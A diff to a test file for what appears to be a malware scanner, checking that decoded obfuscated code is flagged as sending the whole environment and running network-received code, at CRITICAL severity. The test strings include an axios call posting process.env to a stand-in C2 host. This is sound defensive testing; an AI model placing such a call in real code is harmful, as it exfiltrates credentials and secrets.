@@ -26,8 +26,10 @@ test("a helper's hex names and a constant array are read decoded", () => {
   const view = decodedView(TAILWIND);
   assert.ok(view.includes("require('axios')[['post']]('https://c2.invalid/a', { ...process.env })[['then']]"));
   assert.equal(view.split("\n").length, TAILWIND.split("\n").length);
+  // (read on the tree, the decoded view's `[['post']]` is a send too: of the whole environment)
   const [reasons, line] = importTimeRisk(TAILWIND, "js");
-  assert.deepEqual([reasons, line], [["runs code it receives over the network" + NOTE], 13]);
+  assert.deepEqual([reasons, line], [["reads credentials or the whole environment and sends data over the network" + NOTE,
+    "runs code it receives over the network" + NOTE], 13]);
   assert.equal(importTimeSeverity(reasons), "CRITICAL");
 });
 
